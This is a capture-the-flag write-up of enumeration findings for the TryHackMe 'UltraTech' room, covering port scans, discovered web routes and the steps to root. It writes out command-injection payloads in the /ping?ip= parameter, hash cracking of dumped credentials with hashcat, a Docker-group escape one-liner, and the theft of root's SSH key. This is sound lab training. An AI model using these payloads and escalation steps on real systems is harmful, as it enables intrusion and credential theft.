# Enumeration Findings — UltraTech

## Target Information
- **Room:** UltraTech (TryHackMe)
- **Target IP:** 10.10.250.160 (changes each session)

---

## Open Ports (Nmap)

| Port | Protocol | Service | Version |
|------|----------|---------|---------|
| 21 | TCP | FTP | vsftpd 3.0.3 |
| 22 | TCP | SSH | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 8081 | TCP | HTTP | Node.js Express framework |
| 31331 | TCP | HTTP | Apache httpd 2.4.29 (Ubuntu) |

---

## Web Application (Port 8081 — Node.js API)

### Routes discovered via dirb:
- `GET /auth` → Requires login and password credentials
- `GET /ping?ip=` → **Vulnerable to command injection**

### Exploitation:
- Input passed directly to system `ping` command without sanitization
- Used backtick syntax to inject arbitrary commands:  
  `` /ping?ip=`ls` `` → listed working directory  
  `` /ping?ip=`cat utech.db.sqlite` `` → dumped SQLite database

---

## Web Application (Port 31331 — Apache)

### Files discovered:
- `robots.txt` → Revealed sitemap at `/utech_sitemap.txt`
- `/utech_sitemap.txt` → Listed `/index.html`, `/what.html`, `/partners.html`
- `/partners.html` → Login portal ("Private Partners Area")
- `/js/api.js` → Revealed API endpoints: `/ping?ip=` and `/auth`

---

## Database (utech.db.sqlite)

Extracted via command injection. Contents included two user records with MD5 hashes.

| User | Hash (MD5) | Cracked Password |
|------|-----------|-----------------|
| r00t | f357a0c52799563c7c7b76c1e7543a32 | n100906 |
| admin | 0d0ea5111e3c1def594c1684e3b9be84 | mrsheafy |

Cracked using: `hashcat -m 0` with `/usr/share/wordlists/rockyou.txt`

---

## Post-Exploitation

- SSH access gained with cracked credentials
- Docker found running on system
- Docker group membership confirmed via `id` command
- Used GTFOBins Docker breakout: `docker run -v /:/mnt --rm -it bash chroot /mnt sh`
- Root shell obtained; full filesystem access confirmed
- Root SSH private key extracted from `/root/.ssh/id_rsa`